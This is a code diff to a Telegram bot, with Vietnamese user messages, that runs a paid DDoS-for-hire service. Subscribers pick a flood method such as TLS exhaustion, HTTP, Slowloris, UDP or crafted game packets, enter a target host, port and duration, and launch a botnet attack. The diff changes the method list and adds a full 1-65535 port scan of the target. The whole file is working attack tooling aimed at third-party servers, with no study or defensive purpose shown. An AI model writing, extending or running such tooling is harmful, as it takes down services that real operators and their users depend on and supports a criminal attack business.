@@ -207,8 +207,8 @@ async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Chưa có plan active.\nDùng /buy để mua.")
         return
     await ensure_session(user, update.effective_chat.id)
-    methods = plan.allowed_methods or ["MEGA", "TLS_EXHAUST", "HTTP", "SLOWLORIS", "HTTP_PROXY", "GAME", "H2RAPID", "WSFLOOD", "GRAPHQL", "UDP"]
-    valid = {"MEGA", "TLS_EXHAUST", "HTTP", "SLOWLORIS", "HTTP_PROXY", "GAME", "H2RAPID", "WSFLOOD", "GRAPHQL", "UDP"}
+    methods = plan.allowed_methods or ["PSPE", "TCP", "TLS", "HTTP", "GAME"]
+    valid = {"PSPE", "TCP", "TLS", "HTTP", "GAME"}
     methods = [m for m in methods if m in valid]
     if not methods:
         await update.message.reply_text("❌ Plan không có method nào khả dụng.")
@@ -419,8 +419,9 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await s.commit()
         await query.edit_message_text(
             f"⚔️ Method: *{method}*\n\n"
-            f"Nhập target:\n`host:port duration`\n\n"
-            f"VD: `game.example.com:30120 60`",
+            f"Nhập target:\n`host:port duration [scan]`\n\n"
+            f"VD: `game.example.com:30120 60`\n"
+            f"Full scan 1-65535: `game.example.com:30120 60 scan`",
             parse_mode="Markdown",
         )
 
@@ -469,7 +470,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Port không hợp lệ.")
             return
 
-    method = (ts.data or {}).get("method", "UDP")
+    do_scan = False
+    if len(parts) >= 3 and parts[2].lower() in ("scan", "full", "1", "true"):
+        do_scan = True
+
+    method = (ts.data or {}).get("method", "PSPE")
     sub, plan = await get_user_plan(user)
     if not sub or not plan:
         await update.message.reply_text("❌ Chưa có plan. /buy")
@@ -479,17 +484,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     try:
+        if do_scan:
+            await update.message.reply_text(f"🔍 Scanning `{host}` (1-65535)...")
         atk = AttackCreate(
             target_host=host,
             target_port=port,
             method=method,
             duration_secs=min(duration, plan.max_attack_secs),
             pps_per_bot=plan.max_pps_per_bot,
-            mega_mode=(method == "MEGA"),
-            slowloris=(method == "SLOWLORIS"),
-            tls_exhaust=(method == "TLS_EXHAUST"),
-            # HTTP_PROXY: server auto-fetches free proxies if empty
-            # GAME: server sends crafted NRO login packet if empty
+            mega_mode=(method == "PSPE"),
+            tls_exhaust=(method == "TLS"),
+            scan_ports=do_scan,
         )
         task = await AttackService.launch(user, atk)
         await update.message.reply_text(
@@ -497,6 +502,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎯 `{host}:{port}`\n"
             f"├ Method: *{method}*\n"
             f"├ Duration: {min(duration, plan.max_attack_secs)}s\n"
+            f"├ Scan: *{'full 1-65535' if do_scan else 'port only'}*\n"
             f"└ Bots: {len(task.bot_ids or [])}\n\n"
             f"🛑 /stop · 📊 /status",
             parse_mode="Markdown",
